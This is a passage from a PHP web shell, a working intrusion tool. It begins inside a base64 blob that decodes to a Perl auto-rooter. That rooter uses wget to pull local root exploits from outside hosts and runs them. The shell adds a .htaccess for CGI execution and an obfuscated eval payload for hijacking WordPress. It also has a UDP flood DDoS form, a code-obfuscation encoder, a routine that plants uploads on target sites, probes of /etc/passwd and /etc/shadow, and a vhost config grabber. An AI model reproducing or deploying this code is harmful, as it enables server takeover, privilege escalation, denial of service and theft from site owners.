VtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvcHJpdjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHByaXY0Iik7DQpzeXN0ZW0oIi4vcHJpdjQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3B3bmtlcm5lbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcHdua2VybmVsIik7DQpzeXN0ZW0oIi4vcHdua2VybmVsIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9yb290LnB5Iik7DQpzeXN0ZW0oImNobW9kIDc3NyByb290LnB5Iik7DQpzeXN0ZW0oIi4vcm9vdC5weSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvcnVueCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVueCIpOw0Kc3lzdGVtKCIuL3J1bngiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Rpdm9saSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdGl2b2xpIik7DQpzeXN0ZW0oIi4vdGl2b2xpIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC91YnVudHUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHVidW50dSIpOw0Kc3lzdGVtKCIuL3VidW50dSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9hLnBvbWYuc2UvdHhmZmd2LnppcCIpOw0Kc3lzdGVtKCJ1bnppcCB0eGZmZ3YuemlwIik7DQpzeXN0ZW0oImNobW9kICt4IHRyb2xsZWQiKTsNCnN5c3RlbSgiLi90cm9sbGVkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oImNobW9kICt4IDNfWCIpOw0Kc3lzdGVtKCIuLzNfWCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0KDQoNCnByaW50ICJFbmQgTGludXguLiBbK11cbiI7DQp9DQppZiAoJEFSR1ZbMF0gPX4gImJzZCIgKQ0Kew0KcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7DQpwcmludCAiIyBMaW51eC9Cc2QvU3Vub3MgQVVUTy1ST09URVIgICNcbiI7DQpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICAgSGF2ZSBhIGNvZmZlICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICBSb290aW5nIEJTRCAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnN5c3RlbSgidW5hbWUgLWE7bWtkaXIgYnNkO2NkIGJzZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2EucG9tZi5zZS9qd2dvYm4uemlwIik7DQpzeXN0ZW0oInVuemlwIGp3Z29ibi56aXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDQ4bG9jYWwiKTsNCnN5c3RlbSgiLi80OGxvY2FsIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgiY2htb2QgNzc3IGJzZGxvY2FsIik7DQpzeXN0ZW0oIi4vYnNkbG9jYWwiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJjaG1vZCA3NzcgQlNEMy42X2xvY2Fscm9vdCIpOw0Kc3lzdGVtKCIuL0JTRDMuNl9sb2NhbHJvb3QiKTsNCnN5c3RlbSgiaWQiKTsNCg0KDQoNCg0KcHJpbnQgIkVuZCBCc2QuLiBbK11cbiI7DQp9DQppZiAoJEFSR1ZbMF0gPX4gInN1bm9zIiApDQp7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnByaW50ICIjIExpbnV4L0JzZC9TdW5vcyBBVVRPLVJPT1RFUiAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICBIYXZlIGEgY29mZmUgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgIFJvb3RpbmcgU3Vub3MgICAgICAgICAgI1xuIjsNCnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0Kc3lzdGVtKCJ1bmFtZSAtYTtta2RpciBzdW5vcztjZCBzdW5vcyIpOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9hLnBvbWYuc2Uva2twZ3ZzLnppcCIpOw0Kc3lzdGVtKCJ1bnppcCBra3BndnMuemlwIik7DQpzeXN0ZW0oImNobW9kIDc3NyB4X29zaC5wbCAiKTsNCnN5c3RlbSgicGVybCB4X29zaC5wbCAiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC9TdW5PUyUyMDUuOS9zdW5vczU5Iik7DQpzeXN0ZW0oImNobW9kIDc3NyBzdW5vczU5Iik7DQpzeXN0ZW0oIi4vc3Vub3M1OSIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290L1N1bk9TJTIwNS44L2ZpbmFsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmaW5hbCIpOw0Kc3lzdGVtKCIuL2ZpbmFsIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvU3VuT1MlMjA1Ljcvc29sYXJpczI3Iik7DQpzeXN0ZW0oImNobW9kICt4IHNvbGFyaXMyNyIpOw0Kc3lzdGVtKCIuL3NvbGFyaXMyNyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290L1N1bk9TJTIwNS4xMC9zdW5vczUxMCIpOw0Kc3lzdGVtKCJjaG1vZCAreCBzdW5vczUxMCIpOw0Kc3lzdGVtKCIuL3N1bm9zNTEwIik7DQpzeXN0ZW0oImlkIik7DQoNCg0KcHJpbnQgIkVuZCBTdW5PUyAuLlsrXVxuIjsNCn0=';
$chmoderr = fopen("kuda_root/autoroot.pl" ,"w+");
$write = fwrite ($chmoderr ,base64_decode($shellw0rm));
if($write){
print '<p>Script Autoroot is here => '.getcwd().'/kuda_root/autoroot.pl</p>';
fclose($chmoderr);
chmod("kuda_root/autoroot.pl",0755);
//Extracting htaccess to enable perl handler and type all depends on the server :D
$htaccess = 'T3B0aW9ucyBJbmNsdWRlcyBJbmNsdWRlc05PRVhFQyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAucGwNCkFkZFR5cGUgYXBwbGljYXRpb24veC1odHRwZC1jZ2kgLnBsDQpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnBsDQpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnBs';
$lol = fopen("kuda_root/.htaccess" ,"w+");
$dwrite = fwrite ($lol ,base64_decode($htaccess));
fclose($chmoderr);
print '<p>Back Connect and go to this directory => cd '.getcwd().'/kuda_root/</p>';
print "<p>Autoroot Command: perl autoroot.pl</p>";
print '</center>';
    }
}
elseif($_GET['do'] == 'hijack_wp') {
$kudagans="lUh6Yts2EP5hwP/hygWQA6SWX+o2Ziy3duquBdouVdJo2EMYlFFbeSRFIanYztr/3qMkWPKytLO+iDzdPffcZlQKXmPB55qZjiMzk3Nz7nSLBUZcLJ0j6B2etFvPp+3WcSFIAjQwXAqPAIGEmVWGHlalNsQ6BFkYpqaTdTD9JEiYKqY1vBUhW8Mb/oUG12Ou+O3xxFKHiVttcNzzNFfbLRZREsg2QgnunP9+bOVLJ3o2McOFbnhQFaPwQruFCfgdGwspGJIMcSzVGH7p//p59Po1oMVUFlmN++katIxsa//b45gtzBj+0+Nbu8UFym4z7W/vT4fSGIaRw+HZTP4NAydhwZeclIU5O3IRW0mumY9t+bkKKdCYL0TaTxgyBTTycQlNBR6JjFbHrrtNrYbd3t1drxvIxB30+kLc3jG+3f7IfdofjW1Ch6PjYSqWBBVBtwm2jUxVbiAvxSNyKQSshB5sT2BOA1xcU6guXCF2ay+FJNMzGW9oLzfwnnOKGyo4hUZwsJ1ZTPQLFkceqrt+VhW9zk86ZHq2us9yldtdoazZpJjStpTALY0z3MQyoGRxVAoEWtCQLqPtgD0YFEVQfarZ3IZ5A1BfJOLHZDiiC76uMhW7H1NxminrPQ/9OkKmFT4/VlK1XuHQNALTSBj6viAPikfNbRBwtFTsugqWK055M9He7/UIKLnC5TNRwyGjYAfmMbvJ+K1UsC48KpFoVGBuPNI7+WvxziuHCqkZ5maRz5SiK2r953n01x+zD5bZlsO0MarNImjmJ7x3SZYOqorLM59fAKQIautWR8nUwcMB+BwULQYPDub2YPztFAbn89YhYnLje75ifi46sONEmHenRe1zlsJFu/D8rvJAG8VGjZpUWWoqYhTc+XxLweXD0lHLDRWY69YucZXOVnbnC6ggRC1RtPcLlM+LcaNi4jn2VrDAZ1dyjuoSj6pPDk4qCDnrFCFZKak6h1t+DTDNb8TCuesUOv488ABCRsw+YFR6fXIZXchibVqajjm9Pm0VSzcZRpsO+Wv+6vR31oS5nF2BjZ4bYW9RaAjilW0jsAOf3swuc/D2FVmhB6RWxgr2qFm0o0haYLAHgfII7FLhG7BLswaRwQNRhnsQEbm8+7Col+WUxEWzzr+12vbk69dXnXc5vMe7+OtJN0GK52fnP+HEPG7O9DK71lmXv/FU1d2O7q5fH3hlQrO90ykWOtPf6JLGY6qzZOd/pSqW+PoO";error_reporting(0);@set_time_limit(0);eval(gzinflate(str_rot13(base64_decode($kudagans))));
}
elseif($_GET['do'] == 'ddos') {
?>
<form action=" " method="post">
<center>
Your IP: <font color="red"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font>&nbsp;( Don't DoS Yourself Noob )
<h3>DDoS Tool</h3>
<table>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>
<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table><br>
<input type="submit" class="inputzbut" name="fire" value="Fire!">
<br><br>
After initiating the DoS attack, please wait while the browser loads.
</th></center></form></tr></tr></center></form>
<?php
    $submit = $_POST['fire'];
    if (isset($submit)) {
        $packets = 0;
        $ip = $_POST['ip'];
        $rand = $_POST['port'];
        set_time_limit(0);
        ignore_user_abort(FALSE);
        $exec_time = $_POST['time'];
        $time = time();
        print "<br>Flooded: $ip on port $rand <br><br>";
        $max_time = $time + $exec_time;
        for ($i = 0;$i < 65535;$i++) {
            $out.= "X";
        }
        while (1) {
            $packets++;
            if (time() > $max_time) {
                break;
            }
            $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
            if ($fp) {
                fwrite($fp, $out);
                fclose($fp);
            }
        }
        echo "Packet complete at " . time('h:i:s') . " with $packets (" . round(($packets * 65) / 1024, 2) . " mB) packets averaging " . round($packets / $exec_time, 2) . " packets/s ";
    }
}
elseif($_GET['do'] == 'endecode') {
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$text = $_POST['code'];
?>
<center><h3>Encode And Decode By Mr.xBarakuda</h3>
<form method="post"><br>
<textarea cols='60' rows='10' name="code"></textarea><br><br>
<select size="1" name="kuds">
<option value="urlencode">url</option>
<option value="base64">base64</option>
<option value="ur">convert_uu</option>
<option value="json">json</option>
<option value="gzinflates">gzinflate - base64</option>
<option value="str2">str_rot13 - base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="gzinflater">gzinflate - str_rot13 - base64</option>
<option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="hexencode">Hex</option>
<option value="str_rot13">ROT13 Hash</option>
<option value="strlen">strlen</option>
<option value="xxx">unescape</option>
<option value="bbb">charAt</option>
<option value="aaa">chr - bin2hex - substr</option>
<option value="www">chr</option>
<option value="sss">htmlspecialchars</option>
<option value="eee">escape</option>
</select>&nbsp;<input type='submit' name='encd' value='Encode'> <input type='submit' name='decd' value='Decode'>
</form></center>
<br>
<?php 
$submit = $_POST['encd'];
if (isset($submit)){
$op = $_POST["kuds"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;case 'hexencode' : $codi=bin2hex($text);
break;case 'str_rot13' : $codi=str_rot13($text);
break;case 'strlen' : $codi=strlen($text);
break;case 'xxx' : $codi=strlen(bin2hex($text));
break;case 'bbb' : $codi=htmlentities(utf8_decode($text));
break;case 'aaa' : $codi=chr(bin2hex(substr($text)));
break;case 'www' : $codi=chr($text);
break;case 'sss' : $codi=htmlspecialchars($text);
break;case 'eee' : $codi=addslashes($text);
break;default:break;}}

$submit = $_POST['decd'];
if (isset($submit)){
$op = $_POST["kuds"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $codi=utf8_decode(json_decode($text));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'hexencode' : $codi=quoted_printable_decode($text);
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
$html = htmlentities(stripslashes($codi));
echo "<textarea cols=60 rows=10>".$html."</textarea><br>";
}
elseif($_GET['do'] == 'zip_menu') {
    echo "<center>";
    echo "<h3>Zip Menu</h3>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
    $filename = $_FILES["zip_file"]["name"];
    $source = $_FILES["zip_file"]["tmp_name"];
    $type = $_FILES["zip_file"]["type"];
    $name = explode(".", $filename);
    $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    foreach($accepted_types as $mime_type) {
        if($mime_type == $type) {
            $okay = true;
            break;
        } 
    }
    $continue = strtolower($name[1]) == 'zip' ? true : false;
    if(!$continue) {
        $message = "Itu Bukan Zip, GOBLOK COK";
    }
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
    if(move_uploaded_file($source, $targetzip)) {
        $zip = new ZipArchive();
        $x = $zip->open($targetzip); 
        if ($x === true) {
            $zip->extractTo($targetdir);
            $zip->close();
 
            unlink($targetzip);
        }
        $message = "<b>Sukses Cok :)</b>";
    } else {    
        $message = "<b>Error Jancok :(</b>";
    }
}   
echo '<table style="width:100%" border="1">
  <tr><h4>Upload And Unzip</h4><form enctype="multipart/form-data" method="post" action="">
<label>Zip File: <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form><br><br>';
if($message) echo "<p>$message</p>";
echo "</tr><hr color='cyan'><tr><h4>Zip Backup</h4>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input type='text' name='save' value='$dir/kuda_backup.zip' style='width: 450px;' height='10'><br><br>
<input type='submit' name='backup' value='Back Up!' style='width: 215px;'></form><br><br>"; 
    if($_POST['backup']){ 
    $save=$_POST['save'];
    function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
    Zip($_POST['dir'],$save);
    echo "Kelar, save ke <b>$save</b>";
    }
    echo "
    </tr><hr color='cyan'><tr><h4>Unzip Manual</h4>
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input type='text' name='save' value='$dir/kuda_unzip' style='width: 450px;' height='10'><br><br>
    <input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form><br><br>
    </div>";
    if($_POST['extrak']){
    $save=$_POST['save'];
    $zip = new ZipArchive;
    $res = $zip->open($_POST['dir']);
    if ($res === TRUE) {
        $zip->extractTo($save);
        $zip->close();
    echo 'Sukses, lokasi ada di: <b>'.$save.'</b>';
    } else {
    echo 'Gagal Cok :( Ntahlah !';
    }
    }
echo '</tr></table>';   
echo "</center>";
}
  elseif($_GET['do'] == 'honey') { ?>
  <center>
  <h3>Make A Trap And Troll The Lamers</h3>
  <p style='color: cyan;'>Honeypot adalah jebakan dalam bentuk bug palsu untuk menjebak hacker</p>
  <form method="post">
    <input type="submit" name="make" value="Make It">
  </form>
  <?php
    $target = explode("\r\n", $_POST['target']);
    if($_POST['make']) {
      foreach($target as $korban) {
        $global = "upload.php";
        $isi_nama_doang = "PD9waHANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vIFRoaXMgTG9nZ2VkIENvZGVkIEJ5IE1yLnhCYXJha3VkYSAgICAvLw0KLy8gTWFrZSBhIHRyYXAgYW5kIFRyb2xsIHRoZSBMYW1lcnMgOnYgLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ0FzaWEvSmFrYXJ0YScpOw0KJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokcG9ydCA9ICRfU0VSVkVSWydSRU1PVEVfUE9SVCddOw0KJHByb3RvY29sID0gJF9TRVJWRVJbJ1NFUlZFUl9QUk9UT0NPTCddOw0KJG1ldGhvZCA9ICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddOw0KJGFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHRnbCA9IGRhdGUoImQtTS1ZIC8gaDppIGEiKTsNCiRsb2cgPSBmb3Blbigna3VkYV9sb2cudHh0JyAsYSk7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBKRUJBS0FOIEdBTiAiLiIgIik7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBJUCBBZGRyZXNzOiAiLiRpcC4iIExvZ2dlZCBPbiA9PiBbICIuJHRnbC4iIF0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBQb3J0IE51bWJlcjogIi4kcG9ydC4iICIpOw0KZndyaXRlKCRsb2cgLCIgUHJvdG9jb2w6ICIuJHByb3RvY29sLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBVc2VyIEFnZW50OiBbICIuJGFnZW50LiIgXSIuIiAiKTsNCmZ3cml0ZSgkbG9nICwiIE1ldGhvZDogIi4kbWV0aG9kLiIgIik7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQo/Pg0KPCFET0NUWVBFIEhUTUw+DQo8aHRtbD4NCiAgICA8aGVhZD4NCiAgICAgICAgPHRpdGxlPlVwbG9hZCBZb3VyIEltYWdlPC90aXRsZT4NCiAgICA8L2hlYWQ+DQogICAgPGJvZHk+DQogICAgICAgIDxmb3JtIGFjdGlvbj0icHJvY2Nlc3NfY2hlY2sucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPg0KICAgICAgICAgICAgPHA+U2VsZWN0IGltYWdlIHRvIHVwbG9hZDo8L3A+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZVRvVXBsb2FkIiBpZD0iZmlsZVRvVXBsb2FkIj4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQgRmlsZSIgbmFtZT0ic3VibWl0Ij4NCiAgICAgICAgPC9mb3JtPg0KICAgIDwvYm9keT4NCjwvaHRtbD4=";
        $decode_isi = base64_decode($isi_nama_doang);
        $encode = base64_encode($global);
        $ss = fopen($global,"w");
        fputs($ss, $decode_isi);
        echo "[+] <a href='$korban' target='_blank'>$korban</a><br>";
        echo "Done Fake Arbitrary Upload Honeypot ada di => ".$dir." [ upload.php ] berhasil di tanam tinggal nunggu siapa kejebak wkwk<br>";
        $url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
        $post1 = array(
            "target" => "l1_$encode",
            "content" => "$decode_isi",);
        $post2 = array( "upload[]" => "@$global",);
        $output_mkfile = ngirim("$korban", $post1);
          $upload_ah = ngirim("$korban?cmd=upload", $post2);
          }
        }
    }
elseif(isset($_GET['do']) && ($_GET['do'] == 'reverse_ip')){
    ?>
  <center>
    <div id="sitelist">
      <a onClick="window.open('https://hackertarget.com/reverse-ip-lookup/','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="https://hackertarget.com/reverse-ip-lookup/">
        <td><font color=lime>> REVERSE IP <</font>
      </a>
      </td>
  </center>
  </div>
  <?
    }
elseif($_GET['do'] == 'infosec') {
echo '<table><th><h3><u>Server security information</u></h3></th><td><div class=content>';
    function showSecParam($n, $v) {
        $v = trim($v);
        if($v) {
            echo '<span>'.$n.': </span>';
            if(strpos($v, "\n") === false)
                echo $v. '<br><br>';
            else
                echo '<pre class=ml1>'.$v.'</pre>';
        }
    }
    
    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
    showSecParam('Open base dir', @ini_get('open_basedir'));
    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    showSecParam('Supported databases', implode(', ', $temp));
    
    if( $GLOBALS['os'] == 'nix' ) {
        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
        $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
        showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g('FilesTools', '/etc/', 'passwd')'>[view]</a>":'no');
        showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g('FilesTools', 'etc', 'shadow')'>[view]</a>":'no');
        showSecParam('OS version', @file_get_contents('/proc/version'));
        showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
        if(!$GLOBALS['safe_mode']) {
            echo '<br>';
            $temp=array();
            foreach ($userful as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Userful', implode(', ',$temp));
            $temp=array();
            foreach ($danger as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Danger', implode(', ',$temp));
            $temp=array();
            foreach ($downloaders as $item) 
                if(which($item)){$temp[]=$item;}
            showSecParam('Downloaders', implode(', ',$temp));
            echo '<br/>';
            showSecParam('Hosts', @file_get_contents('/etc/hosts'));
            showSecParam('HDD space', exe('df -h'));
            showSecParam('Mount options', @file_get_contents('/etc/fstab'));
        }
    } else {
        showSecParam('OS Version',exe('ver')); 
        showSecParam('Account Settings',exe('net accounts')); 
        showSecParam('User Accounts',exe('net user'));
    }
    echo '</div></td></table>';
}
elseif($_GET['do'] == 'xaivhost') {
    ?>
    <center>
        <h3>Vhosts Config Grabber</h3>
        <td><table width='100%'>
            <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form method='post'>
                <div align='center'>
                    <input type='submit' name='elgass' value='Click Here'>
                </div></form></td></table></td></center>
<?php
if (isset($_POST['elgass'])) {
@mkdir('xaivhost', 0755);
@chdir('xaivhost');
        $elesem = ".htaccess";
        $elakab = "$elesem";
        $filhat = fopen ($elakab , 'w') or die ("Can't Write htaccess !");
        $htcont = "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";   
        fwrite($filhat,$htcont ) ;
        fclose($filhat);
